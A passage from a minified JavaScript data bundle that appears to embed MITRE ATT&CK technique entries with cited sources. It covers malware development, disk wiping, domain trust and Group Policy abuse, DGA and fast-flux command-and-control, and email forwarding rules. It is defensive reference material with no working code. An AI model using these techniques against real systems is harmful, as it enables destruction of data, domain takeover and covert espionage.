2017",url:"https:\u002F\u002Fwww.irongeek.com\u002Fi.php?page=videos\u002Fbsidescharm2017\u002Fbsidescharm-2017-t111-microsoft-patch-analysis-for-exploitation-stephen-sims",description:"Stephen Sims. (2017, April 30). Microsoft Patch Analysis for Exploitation. Retrieved October 16, 2020."}];pE["subtechnique-of"]=aP;pH.id=pI;pH["object-type"]=a;pH.name=pJ;pH.description="Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fservices\u002Fpdfs\u002Fmandiant-apt1-report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Fsofacy-apt-hits-high-profile-targets-with-updated-toolset\u002F72924\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Farstechnica.com\u002Finformation-technology\u002F2014\u002F06\u002Factive-malware-operation-let-attackers-sabotage-us-energy-industry\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.losangeles.va.gov\u002Fdocuments\u002FMI-000120-MW.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F006'\u003EWeb Services\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww2.fireeye.com\u002Frs\u002F848-DID-242\u002Fimages\u002Frpt-apt29-hammertoss.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";pH.external_references=[{source_name:b,external_id:pI,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587\u002F001"},{url:ai,description:aj,source_name:ak},{source_name:pw,description:px,url:py},{source_name:"ActiveMalwareEnergy",description:"Dan Goodin. (2014, June 30). Active malware operation let attackers sabotage US energy industry. Retrieved March 9, 2017.",url:"https:\u002F\u002Farstechnica.com\u002Finformation-technology\u002F2014\u002F06\u002Factive-malware-operation-let-attackers-sabotage-us-energy-industry\u002F"},{source_name:"FBI Flash FIN7 USB",url:"https:\u002F\u002Fwww.losangeles.va.gov\u002Fdocuments\u002FMI-000120-MW.pdf",description:"Federal Bureau of Investigation, Cyber Division. (2020, March 26). FIN7 Cyber Actors Targeting US Businesses Through USB Keystroke Injection Attacks. Retrieved October 14, 2020."},{source_name:"FireEye APT29",description:"FireEye Labs. (2015, July). HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group. Retrieved September 17, 2015.",url:"https:\u002F\u002Fwww2.fireeye.com\u002Frs\u002F848-DID-242\u002Fimages\u002Frpt-apt29-hammertoss.pdf"}];pH["subtechnique-of"]=aP;pL.id=pM;pL["object-type"]=a;pL.name="Disk Content Wipe";pL.description="Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.operationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Foperationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Destructive-Malware-Report.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.justice.gov\u002Fopa\u002Fpress-release\u002Ffile\u002F1092091\u002Fdownload'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.\u003Csup\u003E\u003Ca href='https:\u002F\u002Foperationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Destructive-Malware-Report.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries have been observed leveraging third-party drivers like \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0364'\u003ERawDisk\u003C\u002Fa\u003E to directly access disk content.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.operationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Report.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Foperationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Destructive-Malware-Report.pdf'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This behavior is distinct from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1485'\u003EData Destruction\u003C\u002Fa\u003E because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F002'\u003ESMB\u002FWindows Admin Shares\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Foperationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Destructive-Malware-Report.pdf'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";pL.external_references=[{source_name:b,external_id:pM,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1561\u002F001"},{source_name:e$,description:fa,url:fb},{source_name:fc,description:fd,url:fe},{source_name:cx,url:cy,description:cz},{url:cE,description:cF,source_name:cG}];pL["subtechnique-of"]=cD;pN.id=pO;pN["object-type"]=a;pN.name="Disk Structure Wipe";pN.description="Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Fblogs\u002Fshamoon-attacks'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2016\u002F11\u002Ffireeye_respondsto.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F11\u002Funit42-shamoon-2-return-disttrack-wiper\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F07180722\u002FReport_Shamoon_StoneDrill_final.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fshamoon-3-targets-oil-gas-organization\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1561\u002F002'\u003EDisk Structure Wipe\u003C\u002Fa\u003E may be performed in isolation, or along with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1561\u002F001'\u003EDisk Content Wipe\u003C\u002Fa\u003E if all sectors of a disk are wiped.\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F002'\u003ESMB\u002FWindows Admin Shares\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Fblogs\u002Fshamoon-attacks'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2016\u002F11\u002Ffireeye_respondsto.html'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F11\u002Funit42-shamoon-2-return-disttrack-wiper\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F07180722\u002FReport_Shamoon_StoneDrill_final.pdf'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";pN.external_references=[{source_name:b,external_id:pO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1561\u002F002"},{source_name:oc,url:ob,description:oa},{url:od,description:oe,source_name:of},{url:eP,description:eQ,source_name:eR},{source_name:og,url:oh,description:oi},{source_name:ol,url:ok,description:oj},{url:cE,description:cF,source_name:cG}];pN["subtechnique-of"]=cD;qf.id=qg;qf["object-type"]=a;qf.name="Domain Trust Modification";qf.description="Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and\u002For elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fhybrid\u002Fwhatis-fed'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating the domain trusts may allow an adversary to escalate privileges and\u002For evade defenses by modifying settings to add objects which they control. For example, this may be used to forge \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1606\u002F002'\u003ESAML Tokens\u003C\u002Fa\u003E, without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate.";qf.external_references=[{source_name:b,external_id:qg,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1484\u002F002"},{source_name:"Microsoft - Azure AD Federation",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fhybrid\u002Fwhatis-fed",description:"Microsoft. (2018, November 28). What is federation with Azure AD?. Retrieved December 30, 2020."},{source_name:pY,url:pZ,description:p_},{source_name:fm,url:fn,description:fo},{source_name:p$,url:qa,description:qb},{source_name:qc,url:qd,description:qe}];qf["subtechnique-of"]=cH;qh.id=qi;qh["object-type"]=a;qh.name="Group Policy Modification";qh.description="Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path \u003Ccode\u003E\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.technet.microsoft.com\u002Fmusings_of_a_technical_tam\u002F2012\u002F02\u002F13\u002Fgroup-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=2716'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053'\u003EScheduled Task\u002FJob\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1562\u002F001'\u003EDisable or Modify Tools\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1105'\u003EIngress Tool Transfer\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1136'\u003ECreate Account\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1569\u002F002'\u003EService Execution\u003C\u002Fa\u003E,  and more.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=2716'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwald0.com\u002F?p=179'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Fredteaming\u002Fabusing-gpo-permissions\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fcurrent-threats\u002Fpdfs\u002Frpt-mtrends-2016.pdf'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.microsoft.com\u002Fsecurity\u002Fblog\u002F2016\u002F06\u002F01\u002Fhacking-team-breach-a-cyber-jurassic-park\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwald0.com\u002F?p=179'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nFor example, publicly available scripts such as \u003Ccode\u003ENew-GPOImmediateTask\u003C\u002Fcode\u003E can be leveraged to automate the creation of a malicious \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053'\u003EScheduled Task\u002FJob\u003C\u002Fa\u003E by modifying GPO settings, in this case modifying \u003Ccode\u003E&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwald0.com\u002F?p=179'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Fredteaming\u002Fabusing-gpo-permissions\u002F'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in \u003Ccode\u003E&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\u003C\u002Fcode\u003E, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Factivedirectory\u002Fthe-most-dangerous-user-right-you-probably-have-never-heard-of\u002F'\u003E[11]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";qh.external_references=[{source_name:b,external_id:qi,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1484\u002F001"},{source_name:"TechNet Group Policy Basics",url:"https:\u002F\u002Fblogs.technet.microsoft.com\u002Fmusings_of_a_technical_tam\u002F2012\u002F02\u002F13\u002Fgroup-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object\u002F",description:"srachui. (2012, February 13). Group Policy Basics – Part 1: Understanding the Structure of a Group Policy Object. Retrieved March 5, 2019."},{source_name:pP,url:pQ,description:pR},{source_name:pU,url:pT,description:pS},{source_name:pV,url:pW,description:pX},{source_name:qj,url:qk,description:ql},{source_name:"Microsoft Hacking Team Breach",url:"https:\u002F\u002Fwww.microsoft.com\u002Fsecurity\u002Fblog\u002F2016\u002F06\u002F01\u002Fhacking-team-breach-a-cyber-jurassic-park\u002F",description:"Microsoft Secure Team. (2016, June 1). Hacking Team Breach: A Cyber Jurassic Park. Retrieved March 5, 2019."},{source_name:"Harmj0y SeEnableDelegationPrivilege Right",url:"http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Factivedirectory\u002Fthe-most-dangerous-user-right-you-probably-have-never-heard-of\u002F",description:"Schroeder, W. (2017, January 10). The Most Dangerous User Right You (Probably) Have Never Heard Of. Retrieved March 5, 2019."}];qh["subtechnique-of"]=cH;qA.id=qB;qA["object-type"]=a;qA.name="DNS Calculation";qA.description="Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and\u002For port number calculation can be used to bypass egress filtering on a C2 channel.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.crowdstrike.com\u002Fblog\u002Fwhois-numbered-panda\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nOne implementation of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1568\u002F003'\u003EDNS Calculation\u003C\u002Fa\u003E is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.crowdstrike.com\u002Fblog\u002Fwhois-numbered-panda\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2014\u002F09\u002Fdarwins-favorite-apt-group-2.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.rapid7.com\u002F2013\u002F08\u002F26\u002Fupcoming-g20-summit-fuels-espionage-operations\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";qA.external_references=[{source_name:b,external_id:qB,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1568\u002F003"},{url:"http:\u002F\u002Fwww.crowdstrike.com\u002Fblog\u002Fwhois-numbered-panda\u002F",description:"Meyers, A. (2013, March 29). Whois Numbered Panda. Retrieved January 14, 2016.",source_name:"Meyers Numbered Panda"},{url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2014\u002F09\u002Fdarwins-favorite-apt-group-2.html",description:"Moran, N., Oppenheim, M., Engle, S., & Wartell, R.. (2014, September 3). Darwin’s Favorite APT Group &#91;Blog&#93;. Retrieved November 12, 2014.",source_name:"Moran 2014"},{source_name:"Rapid7G20Espionage",description:"Rapid7. (2013, August 26). Upcoming G20 Summit Fuels Espionage Operations. Retrieved March 6, 2017.",url:"https:\u002F\u002Fblog.rapid7.com\u002F2013\u002F08\u002F26\u002Fupcoming-g20-summit-fuels-espionage-operations\u002F"}];qA["subtechnique-of"]=by;qC.id=qD;qC["object-type"]=a;qC.name="Domain Generation Algorithms";qC.description="Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fgo.cybereason.com\u002Frs\u002F996-YZT-709\u002Fimages\u002FCybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fumbrella.cisco.com\u002Fblog\u002F2016\u002F10\u002F10\u002Fdomain-generation-algorithms-effective\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fthreat-brief-understanding-domain-generation-algorithms-dga\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nDGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fgo.cybereason.com\u002Frs\u002F996-YZT-709\u002Fimages\u002FCybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fumbrella.cisco.com\u002Fblog\u002F2016\u002F10\u002F10\u002Fdomain-generation-algorithms-effective\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.talosintelligence.com\u002F2017\u002F09\u002Favast-distributes-malware.html'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.akamai.com\u002F2018\u002F01\u002Fa-death-match-of-domain-generation-algorithms.html'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may use DGAs for the purpose of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1008'\u003EFallback Channels\u003C\u002Fa\u003E. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.talosintelligence.com\u002F2017\u002F09\u002Favast-distributes-malware.html'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F03\u002Fdissecting_one_ofap.html'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2017\u002F12\u002F21\u002Fsednit-update-fancy-bear-spent-year\u002F'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";qC.external_references=[{source_name:b,external_id:qD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1568\u002F002"},{source_name:"Cybereason Dissecting DGAs",url:"http:\u002F\u002Fgo.cybereason.com\u002Frs\u002F996-YZT-709\u002Fimages\u002FCybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf",description:"Sternfeld, U. (2016). Dissecting Domain Generation Algorithms: Eight Real World DGA Variants. Retrieved February 18, 2019."},{source_name:"Cisco Umbrella DGA",url:"https:\u002F\u002Fumbrella.cisco.com\u002Fblog\u002F2016\u002F10\u002F10\u002Fdomain-generation-algorithms-effective\u002F",description:"Scarfo, A. (2016, October 10). Domain Generation Algorithms – Why so effective?. Retrieved February 18, 2019."},{source_name:"Unit 42 DGA Feb 2019",url:"https:\u002F\u002Funit42.paloaltonetworks.com\u002Fthreat-brief-understanding-domain-generation-algorithms-dga\u002F",description:"Unit 42. (2019, February 7). Threat Brief: Understanding Domain Generation Algorithms (DGA). Retrieved February 19, 2019."},{url:qo,description:qp,source_name:qq},{source_name:"Akamai DGA Mitigation",url:"https:\u002F\u002Fblogs.akamai.com\u002F2018\u002F01\u002Fa-death-match-of-domain-generation-algorithms.html",description:"Liu, H. and Yuzifovich, Y. (2018, January 9). A Death Match of Domain Generation Algorithms. Retrieved February 18, 2019."},{url:qr,description:qs,source_name:qt},{source_name:qu,url:qv,description:qw},{source_name:qx,url:qy,description:qz},{source_name:"Pace University Detecting DGA May 2017",url:"http:\u002F\u002Fcsis.pace.edu\u002F~ctappert\u002Fsrd2017\u002F2017PDF\u002Fd4.pdf",description:"Chen, L., Wang, T.. (2017, May 5). Detecting Algorithmically Generated Domains Using Data Visualization and N-Grams Methods . Retrieved April 26, 2019."},{source_name:"Elastic Predicting DGA",url:"https:\u002F\u002Farxiv.org\u002Fpdf\u002F1611.00791.pdf",description:"Ahuja, A., Anderson, H., Grant, D., Woodbridge, J.. (2016, November 2). Predicting Domain Generation Algorithms with Long Short-Term Memory Networks. Retrieved April 26, 2019."}];qC["subtechnique-of"]=by;qE.id=qF;qE["object-type"]=a;qE.name="Fast Flux DNS";qE.description="Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresources.infosecinstitute.com\u002Ffast-flux-networks-working-detection-part-1\u002F#gref'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresources.infosecinstitute.com\u002Ffast-flux-networks-working-detection-part-2\u002F#gref'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2017\u002F01\u002F12\u002Ffast-flux-networks-work\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2017\u002F01\u002F12\u002Ffast-flux-networks-work\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.";qE.external_references=[{source_name:b,external_id:qF,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1568\u002F001"},{url:"https:\u002F\u002Fresources.infosecinstitute.com\u002Ffast-flux-networks-working-detection-part-1\u002F#gref",description:"Mehta, L. (2014, December 17). Fast Flux Networks Working and Detection, Part 1. Retrieved March 6, 2017.",source_name:"MehtaFastFluxPt1"},{source_name:"MehtaFastFluxPt2",description:"Mehta, L. (2014, December 23). Fast Flux Networks Working and Detection, Part 2. Retrieved March 6, 2017.",url:"https:\u002F\u002Fresources.infosecinstitute.com\u002Ffast-flux-networks-working-detection-part-2\u002F#gref"},{source_name:"Fast Flux - Welivesecurity",url:"https:\u002F\u002Fwww.welivesecurity.com\u002F2017\u002F01\u002F12\u002Ffast-flux-networks-work\u002F",description:"Albors, Josep. (2017, January 12). Fast Flux networks: What are they and how do they work?. Retrieved March 11, 2020."}];qE["subtechnique-of"]=by;qJ.id=qK;qJ["object-type"]=a;qJ.name="Email Forwarding Rule";qJ.description="Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA18-086A'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Similarly, Google Workspace users or administrators can set up mail forwarding rules via the Google Workspace web interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.\u003Csup\u003E\u003Ca 